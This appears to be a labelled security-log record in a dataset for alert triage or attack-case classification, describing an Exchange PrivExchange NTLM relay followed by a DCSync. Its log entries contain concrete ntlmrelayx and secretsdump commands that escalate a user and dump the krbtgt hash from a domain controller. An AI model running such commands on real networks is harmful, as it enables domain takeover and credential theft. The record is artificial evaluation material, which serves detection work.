@@ -1,0 +1,41 @@
+{
+ "unit": 1106,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "Exchange PrivExchange+中继，与 CASE-008 的 webshell 链不同族"
+ },
+ "technique": "PrivExchange 推送订阅 + ntlmrelayx 中继 LDAP → secretsdump DCSync",
+ "sources": [
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-11 22:02:51",
+   "source": "rasp",
+   "log_id": "RASP0530095",
+   "content": "https://app-iis-51.ops-corp.com/EWS/Exchange.asmx {\"ntlm_relay\": \"ldap://10.20.3.10\", \"push_sub\": true} Mozill",
+   "event_id": "1106-RASP0530095"
+  },
+  {
+   "timestamp": "2026-07-11 22:04:49",
+   "source": "hids",
+   "log_id": "HID0519227",
+   "content": "ntlmrelayx.py -t ldap://10.20.3.10 --escalate-user svc_scan ntlmrelayx.py <== /bin/bash -c",
+   "event_id": "1106-HID0519227"
+  },
+  {
+   "timestamp": "2026-07-11 22:08:49",
+   "source": "hids",
+   "log_id": "HID0519247",
+   "content": "secretsdump.py -just-dc-user krbtgt CORP/administrator@dc01.corp.local secretsdump.py <== /bin/bash -c",
+   "event_id": "1106-HID0519247"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
